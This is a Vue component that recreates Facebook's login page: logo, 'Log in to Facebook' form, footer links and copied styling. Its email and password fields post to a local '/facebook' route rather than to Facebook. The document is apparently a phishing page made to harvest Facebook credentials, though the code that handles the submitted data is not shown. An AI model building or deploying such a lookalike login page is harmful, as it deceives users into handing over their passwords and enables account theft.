<template>
  <div class="container__fb">
    <div class="fb_content">
      <div class="form__fb">
        <div class="logo">
          <img
            src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
            alt=""
          >
        </div>
        <div class="form-content">
          <div class="title">Log in to Facebook</div>
          <form
            action="/facebook"
            method="post"
          >
            <div class="form-item">
              <input
                type="email"
                class="input__fb"
                name="email"
                placeholder="Email addess or phone number"
              >
            </div>
            <div class="form-item">
              <input
                type="password"
                class="input__fb"
                name="password"
                placeholder="Password"
              >
            </div>
            <div class="form-submit">
              <button
                type="submit"
                class="btn btn-primary btn__fb"
              >Log in</button>
            </div>
            <div class="help__fb">
              <a href="https://www.facebook.com/recover/initiate/?ars=facebook_login">Forgotten account?</a>
              <span
                role="presentation"
                aria-hidden="true"
              > · </span>
              <a href="">Sign up for Facebook</a>
            </div>
          </form>
        </div>
      </div>
    </div>
    <div class="fb_footer">
      <div
        id="pageFooter"
        data-referrer="page_footer"
        data-testid="page_footer"
      >
        <ul
          class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i"
          data-nocookies="1"
        >
          <li>English (UK)</li>
          <li><a
              class="_sv4"
              dir="ltr"
              href="https://vi-vn.facebook.com/login/"
              onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;vi_VN&quot;, &quot;en_GB&quot;, &quot;https:\/\/vi-vn.facebook.com\/login\/&quot;, &quot;www_list_selector&quot;, 0); return false;"
              title="Vietnamese"
            >Tiếng Việt</a></li>
          <li><a
              class="_sv4"
              dir="ltr"
              href="https://zh-tw.facebook.com/login/"
              onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;zh_TW&quot;, &quot;en_GB&quot;, &quot;https:\/\/zh-tw.facebook.com\/login\/&quot;, &quot;www_list_selector&quot;, 1); return false;"
              title="Traditional Chinese (Taiwan)"
            >中文(台灣)</a></li>
          <li><a
              class="_sv4"
              dir="ltr"
              href="https://ko-kr.facebook.com/login/"
              onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ko_KR&quot;, &quot;en_GB&quot;, &quot;https:\/\/ko-kr.facebook.com\/login\/&quot;, &quot;www_list_selector&quot;, 2); return false;"
              title="Korean"
            >한국어</a></li>
          <li><a
              class="_sv4"
              dir="ltr"
              href="https://ja-jp.facebook.com/login/"
              onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ja_JP&quot;, &quot;en_GB&quot;, &quot;https:\/\/ja-jp.facebook.com\/login\/&quot;, &quot;www_list_selector&quot;, 3); return false;"
              title="Japanese"
            >日本語</a></li>
          <li><a
              class="_sv4"
              dir="ltr"
              href="https://fr-fr.facebook.com/login/"
              onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;fr_FR&quot;, &quot;en_GB&quot;, &quot;https:\/\/fr-fr.facebook.com\/login\/&quot;, &quot;www_list_selector&quot;, 4); return false;"
              title="French (France)"
            >Français (France)</a></li>
          <li><a
              class="_sv4"
              dir="ltr"
              href="https://th-th.facebook.com/login/"
              onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;th_TH&quot;, &quot;en_GB&quot;, &quot;https:\/\/th-th.facebook.com\/login\/&quot;, &quot;www_list_selector&quot;, 5); return false;"
              title="Thai"
            >ภาษาไทย</a></li>
          <li><a
              class="_sv4"
              dir="ltr"
              href="https://es-la.facebook.com/login/"
              onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;es_LA&quot;, &quot;en_GB&quot;, &quot;https:\/\/es-la.facebook.com\/login\/&quot;, &quot;www_list_selector&quot;, 6); return false;"
              title="Spanish"
            >Español</a></li>
          <li><a
              class="_sv4"
              dir="ltr"
              href="https://pt-br.facebook.com/login/"
              onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;pt_BR&quot;, &quot;en_GB&quot;, &quot;https:\/\/pt-br.facebook.com\/login\/&quot;, &quot;www_list_selector&quot;, 7); return false;"
              title="Portuguese (Brazil)"
            >Português (Brasil)</a></li>
          <li><a
              class="_sv4"
              dir="ltr"
              href="https://de-de.facebook.com/login/"
              onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;de_DE&quot;, &quot;en_GB&quot;, &quot;https:\/\/de-de.facebook.com\/login\/&quot;, &quot;www_list_selector&quot;, 8); return false;"
              title="German"
            >Deutsch</a></li>
          <li><a
              class="_sv4"
              dir="ltr"
              href="https://it-it.facebook.com/login/"
              onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;it_IT&quot;, &quot;en_GB&quot;, &quot;https:\/\/it-it.facebook.com\/login\/&quot;, &quot;www_list_selector&quot;, 9); return false;"
              title="Italian"
            >Italiano</a></li>
          <li><a
              role="button"
              class="_42ft _4jy0 _517i _517h _51sy"
              rel="dialog"
              ajaxify="/settings/language/language/?uri=https%3A%2F%2Fit-it.facebook.com%2Flogin%2F&amp;source=www_list_selector_more"
              href="#"
              title="Show more languages"
            ><i class="img sp_gMujFo71RwJ sx_25f620"></i></a></li>
        </ul>
        <div id="contentCurve"></div>
        <div
          id="pageFooterChildren"
          role="contentinfo"
          aria-label="Facebook site links"
        >
          <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
            <li><a
                href=""
                title="Sign up for Facebook"
              >Sign Up</a></li>
            <li><a
                href=""
                title="Log in to Facebook"
              >Log In</a></li>
            <li><a
                href="https://messenger.com/"
                title="Take a look at Messenger."
              >Messenger</a></li>
            <li><a
                href=""
                title="Facebook Lite for Android."
              >Facebook Lite</a></li>
            <li><a
                href="https://www.facebook.com/watch/"
                title="Browse our Watch videos."
              >Watch</a></li>
            <li><a
                href=""
                title="Take a look at popular places on Facebook."
              >Places</a></li>
            <li><a
                href=""
                title="Check out Facebook games."
              >Games</a></li>
            <li><a
                href=""
                title="Buy and sell on Facebook Marketplace."
              >Marketplace</a></li>
            <li><a
                href="https://pay.facebook.com/"
                title="Learn more about Facebook Pay"
                target="_blank"
              >Facebook Pay</a></li>
            <li><a
                href="https://www.oculus.com/"
                title="Learn more about Oculus"
                target="_blank"
              >Oculus</a></li>
            <li><a
                href="https://portal.facebook.com/"
                title="Learn more about Facebook Portal"
                target="_blank"
              >Portal</a></li>
            <li><a
                href="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT3XqXWgnaPo9rWoSquVTc5zui3IJnSC8ZO-76eO7J7rIWiK6lmMq1PTCRBybQUlCUMuscFZYAirapt0RCCCRoKwYK-UMAss99KcnUbjsXTNWriXceKKeTNULtlmocicKcfD6lhZ3GVxwJrLjWjkTA"
                title="Take a look at Instagram"
                target="_blank"
                rel="noopener nofollow"
                data-lynx-mode="asynclazy"
              >Instagram</a></li>
            <li><a
                href="https://www.bulletin.com/"
                title="Take a look at Bulletin newsletter"
              >Bulletin</a></li>
            <li><a
                href=""
                title="Browse our Local Lists directory."
              >Local</a></li>
            <li><a
                href=""
                title="Donate to worthy causes."
              >Fundraisers</a></li>
            <li><a
                href=""
                title="Browse our Facebook Services directory."
              >Services</a></li>
            <li><a
                href=""
                title="See the Voting Information Centre"
              >Voting Information Centre</a></li>
            <li><a
                href=""
                title="Explore our groups."
              >Groups</a></li>
            <li><a
                href="https://about.facebook.com/"
                accesskey="8"
                title="Read our blog, discover the resource centre and find job opportunities."
              >About</a></li>
            <li><a
                href=""
                title="Advertise on Facebook"
              >Create ad</a></li>
            <li><a
                href=""
                title="Create a Page"
              >Create Page</a></li>
            <li><a
                href="https://developers.facebook.com/?ref=pf"
                title="Develop on our platform."
              >Developers</a></li>
            <li><a
                href=""
                title="Make your next career move to our brilliant company."
              >Careers</a></li>
            <li><a
                data-nocookies="1"
                href=""
                title="Learn about your privacy and Facebook."
              >Privacy</a></li>
            <li><a
                href=""
                title="Learn about cookies and Facebook."
                data-nocookies="1"
              >Cookies</a></li>
            <li><a
                class="_41ug"
                data-nocookies="1"
                href="https://www.facebook.com/help/568137493302217"
                title="Learn about AdChoices."
              >AdChoices<i class="img sp_gMujFo71RwJ sx_bdef52"></i></a></li>
            <li><a
                data-nocookies="1"
                href=""
                accesskey="9"
                title="Review our terms and policies."
              >Terms</a></li>
            <li><a
                href=""
                accesskey="0"
                title="Visit our Help Centre."
              >Help</a></li>
            <li><a
                accesskey="6"
                class="accessible_elem"
                href=""
                title="View and edit your Facebook settings."
              >Settings</a></li>
            <li><a
                accesskey="7"
                class="accessible_elem"
                href=""
                title="View your activity log"
              >Activity log</a></li>
          </ul>
        </div>
        <div class="mvl copyright">
          <div><span> Meta © 2022</span></div>
        </div>
      </div>
    </div>
  </div>
</template>

<style lang="scss" scoped>
.container__fb {
  .fb_content {
    background-color: #f0f2f5;
  }
  .form__fb {
    text-align: center;
    padding: 80px 0;
    .logo {
      img {
        margin: -44px 0 -4px 0;
        width: 240px;
      }
    }

    .form-content {
      background-color: #fff;
      width: 396px;
      margin: auto;
      border-radius: 5px;
      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);

      .title {
        padding: 24px 0 16px 0;
        font-size: 18px;
      }
    }
  }
  .form-item {
    margin: 0 16px;
    padding: 6px 0;
  }
  .input__fb {
    min-width: 330px;
    min-height: 22px;
    border-radius: 5px;
    border: 1px solid #dddfe2;
    padding: 14px 16px;
    font-size: 17px;
  }
  .form-submit {
    padding: 6px 0;
  }
  .btn__fb {
    color: #fff;
    background-color: #1877f2;
    border: none;
    border-radius: 6px;
    font-size: 20px;
    line-height: 48px;
    padding: 0 16px;
    width: 364px;
    font-weight: bold;
  }

  .help__fb {
    padding: 12px 0 18px;
    a {
      color: #1877f2;
      font-size: 14px;
      font-weight: 500;
      &:hover {
        cursor: pointer;
        text-decoration: underline;
      }
    }
  }

  .fb_footer {
    margin-top: 125px;
    padding-top: 20px;
    #pageFooter {
      color: #737373;
      margin: 0 auto;
      width: 980px;

      a {
        text-decoration: none;
        white-space: nowrap;
        &:last-child {
          margin-right: 0;
        }
      }

      .pageFooterLinkList {
        margin-left: -20px;
        line-height: 1.6;
        display: flex;
        flex-wrap: wrap;
      }
      .localeSelectorList {
        align-items: center;
        display: flex;
        flex-wrap: wrap;

        a {
          color: #8a8d91;
        }
      }

      ._2pid {
        padding-top: 8px;
      }

      ._4ki._6-h > li {
        padding-right: 0;
        &:first-child {
          padding-left: 0;
        }
      }

      ._4ki._6-j > li {
        padding-left: 10px;
        padding-right: 10px;
      }

      ._4ki._6-i > li {
        padding-right: 0;
      }

      ._4ki._703 > li {
        padding-left: 20px;
      }

      #contentCurve {
        border-bottom: 1px solid #dddfe2;
        font-size: 1px;
        height: 8px;
        margin-bottom: 8px;
      }
    }
    #pageFooterChildren {
      a {
        color: #8a8d91 !important;
      }
    }

    .mvl {
      margin-top: 20px;
      margin-bottom: 20px;
    }
  }
}
</style>
